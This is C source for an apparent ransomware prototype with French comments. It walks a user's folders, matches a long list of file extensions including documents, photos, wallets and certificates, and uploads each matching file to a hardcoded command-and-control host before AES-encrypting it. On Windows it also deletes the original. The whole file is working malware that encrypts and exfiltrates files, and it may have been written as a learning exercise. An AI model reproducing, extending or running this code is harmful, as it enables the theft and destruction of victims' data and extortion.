#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <openssl/evp.h>
#include <openssl/aes.h>


#include <openssl/rand.h>

#include <openssl/err.h>

#include "files.h"
#include "encryption.h"

void sendFileToApi(const char *path, const char *id, const char *api);
char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size);
void write_to_file(char *filename, char *value, int size);
void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL);

// Liste des extensions à chiffrer
const char *extensions[] = {".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", 
                            ".csv", ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", 
                            ".qdf", ".gdb", ".tax", ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf", 
                            ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", 
                            ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", 
                            ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", 
                            ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", 
                            ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", 
                            ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", 
                            ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", ".rofl", ".hkx", 
                            ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", 
                            ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", 
                            ".wallet", ".wotreplay", ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css", 
                            ".rb", ".png", ".jpeg", ".jpg", ".txt", ".p7c", ".p7b", ".p12", ".pfx", ".pem", 
                            ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl", 
                            ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", 
                            ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".cdr", ".indd", ".ai", 
                            ".eps", ".pdf", ".pdd", ".psd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg", ".xf", 
                            ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm", 
                            ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt"};

const size_t num_extensions = sizeof(extensions) / sizeof(extensions[0]);


int main(){

    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();

    //Generate AES key and IV
    unsigned char key[32];
    size_t key_size = sizeof(key);
    RAND_bytes(key, key_size);

    unsigned char iv[16];
    size_t iv_size = sizeof(iv);
    RAND_bytes(iv, iv_size);

    char *key_lisible;
    char *iv_lisible;

    key_lisible = debug_bytes(key, key_size);
    iv_lisible = debug_bytes(iv, iv_size);

    write_to_file("aes_key.txt", key_lisible, 64);
    write_to_file("iv.txt", iv_lisible, 32);

    //Authentication string
    static const unsigned char aad[] = "Cyan";

    //Encrypt the specified file
    //encrypt_file(key, iv, aad, "1v1.jpg");

    //Decrypt the specified file
    //decryptFile(key, iv, aad, "1v1.jpg.cha");

    //Encrypt the AES key and IV with the RSA public key
    const char* public_key_pem = "-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAl+Ddet9QlwRgiq0m5bks\nK1pECg8k/lPvHjFbdsz2IPWA2annk/aYmN8DZR4+fz1NSy6mcxHoCJPh9mK4ngJ8\nezml7P5008MsDSohPQdaCDlZu3YV7mQGrtx1cZgxN8FjGszAAhU0BovdKM6OHmKb\nvPH08tV/SZuu0skcDDVTHZwrm4GYuFIi6dBLyIKuzYytXNt2Y7YT9r9NINVdpIf5\nnzY+6KobIjX/B3z4IvF8DHyESf8/u+SNAfe+kTK/INO8/TqUY1Y568QH6dbPro7z\nAABa6tj62d7mVD68vaQI6nh5Vh7TN0Ps6SnjBDV+NbTKq1jA5dEH+I9EMJx69n0m\nxyYpt5q5mRdn0ya7VqNkUT7jTZQ2gyPy0Yf8u8jBZ6lpaEvnqltlmsGpx3SAjKkl\nrrnDXqq+VopCIEFBVps1opjZtk5jafp5TP/JCzNFzW3ajaAZdWFbppHCWeegE4d7\nVOJqh+w3jpxAzbAUYu5Sykc2sWZZep82FhBSlqeDBJ1PmOsi5oiMSgAnUNGzaBOn\n1ZWjvXRTAC9zd/EyOzKoQ4eQh7UJYsIdzbDMdgq15Cesgp18+ohvcdtnmAHQ//mH\nKU1TOQ8qlPjvIeYAdXQT+qwXNPTadxszucJs3c+7BLxJMXD/bMh4Sq6PYza3Rg27\nF07u/gwEJGvCzV87VvqAj90CAwEAAQ==\n-----END PUBLIC KEY-----\n";

    const unsigned char* encrypted_aes_key = encrypt_RSA(public_key_pem, key, key_size);
    const unsigned char* encrypted_iv = encrypt_RSA(public_key_pem, iv, iv_size);

    OPENSSL_free(encrypted_aes_key);
    OPENSSL_free(encrypted_iv);

    //const char *URL = "http://127.0.0.1:42956/upload";
    char ip[] = "willchabemyvalentine.love";
    int port = 42956;
    const char *URL[100];
    sprintf(URL, "http://%s:%d/upload", ip, port);
    const unsigned char *ID = key_lisible;

    sendFileToApi("iv.txt", ID, URL);
    browse_files(key, iv, aad, ID, URL);

    //Redirect to C2's web page for instructions

    return 0;
}

void sendFileToApi(const char *path, const char *id, const char *api){
    /*Documentation: https://curl.se/libcurl/c/fileupload.html */
    CURL *curl;
    CURLcode res;
    curl_mime *form = NULL;
    curl_mimepart *field = NULL;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
        form = curl_mime_init(curl);

        // Add the file
        field = curl_mime_addpart(form);
        curl_mime_name(field, "file");
        curl_mime_filedata(field, path);

        // Add id
        field = curl_mime_addpart(form);
        curl_mime_name(field, "id");
        curl_mime_data(field, id, CURL_ZERO_TERMINATED);

        // Add road of the api
        curl_easy_setopt(curl, CURLOPT_URL, api);

        // Attach everything
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        // Execute
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }

        // Clean to make a new upload
        curl_mime_free(form);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();

}

char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size){
    char* lisible = (char*)malloc(sequence_size * 2 + 1); // +1 pour le caractère de fin de chaîne
    if (lisible == NULL) {
        fprintf(stderr, "Memory allocation failed.\n");
        exit(EXIT_FAILURE);
    }
    size_t j = 0;
    for (size_t i = 0; i < sequence_size; ++i) {
        j += sprintf(&lisible[j], "%02x", byte_sequence[i]);
    }
    printf("KEY / IV : %s\n", lisible); // Affiche la représentation hexadécimale
    return lisible;
}

void write_to_file(char *filename, char *value, int size){
    FILE *file_pointer;
    file_pointer = fopen(filename, "w"); // Ouvre le fichier en mode écriture

    if (file_pointer == NULL) {
        printf("Error: cannot open the file.\n");
    }

    fwrite(value, sizeof(char), size, file_pointer); // Écrit la clé dans le fichier

    fclose(file_pointer); // Ferme le fichier
}

void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL){
    // List all the files we want to encrypt
    const char *path;

    #ifdef _WIN32
    path = "C:\\Users\\me\\Documents";
    #else
    path = "/home/mike/Pictures";
    #endif

    PathList pathList;
    initPathList(&pathList);

    listFiles(path, &pathList);

    //Browse files
    for (size_t i = 0; i < pathList.count; ++i) {

        if (strstr(pathList.paths[i], "basic_c/") != NULL) {
            continue; // Ignorer le dossier "basic_c" et ses fichiers
        }
        
        // Check if the file has one of the specified extensions
        char *extension = strrchr(pathList.paths[i], '.');
        if (extension != NULL) {
            for (size_t j = 0; j < num_extensions; ++j) {
                if (strcmp(extension, extensions[j]) == 0) {
                    // Send the files to the C2 before being encrypted
                    sendFileToApi(pathList.paths[i], id, URL);
                    // Encrypt the file
                    encrypt_file(key, iv, aad, pathList.paths[i]);
                    // Decrypt the file (for demonstration purposes)
                    sleep(1);
                    #ifdef _WIN32
                    // Supprimer le fichier d'origine après chiffrement sur Windows
                    if (remove(pathList.paths[i]) == 0) {
                        printf("File deleted successfully: %s\n", pathList.paths[i]);
                    } else {
                        printf("Error deleting file: %s\n", pathList.paths[i]);
                    }
                    #endif
                    char encrypted_path[1024];
                    snprintf(encrypted_path, sizeof(encrypted_path), "%s.cha", pathList.paths[i]);
                    sleep(1);
                    printf("Decrypting file: %s\n", encrypted_path);
                    decryptFile(key, iv, aad, encrypted_path);
                    #ifdef _WIN32
                    if (remove(encrypted_path) == 0) {
                        printf("Decrypted file deleted successfully: %s\n", encrypted_path);
                    } else {
                        printf("Error deleting decrypted file: %s\n", encrypted_path);
                    }
                    #endif
                    break;
                }
            }
        }
    }

    freePathList(&pathList);
}
